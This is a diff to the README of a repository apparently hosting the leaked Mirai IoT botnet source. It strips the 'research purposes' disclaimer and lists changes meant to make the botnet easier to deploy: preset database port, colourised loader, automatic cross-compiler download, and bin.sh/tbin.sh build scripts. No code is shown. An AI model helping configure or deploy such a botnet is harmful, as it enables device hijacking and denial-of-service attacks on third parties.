@@ -1,10 +1,10 @@
 # Mirai BotNet
-Leaked Linux.Mirai Source Code for Research/IoT Development Purposes
-
-Uploaded for research purposes and so we can develop IoT and such.
-
-See "ForumPost.txt" or [ForumPost.md](ForumPost.md) for the post in which it
-leaks, if you want to know how it is all set up and the likes.
+* Not require prompt.text file to run cnc.
+* Already added :3306 in main.go
+* Colorful loader [Thank you ฿TC!]
+* Added auto download cross-compile and export PATH [Original file did not have wget option]
+* bin.sh and tbin.sh scripts in folder scripts
+* Let it be easy to use xD
 
 ## Requirements
 * gcc
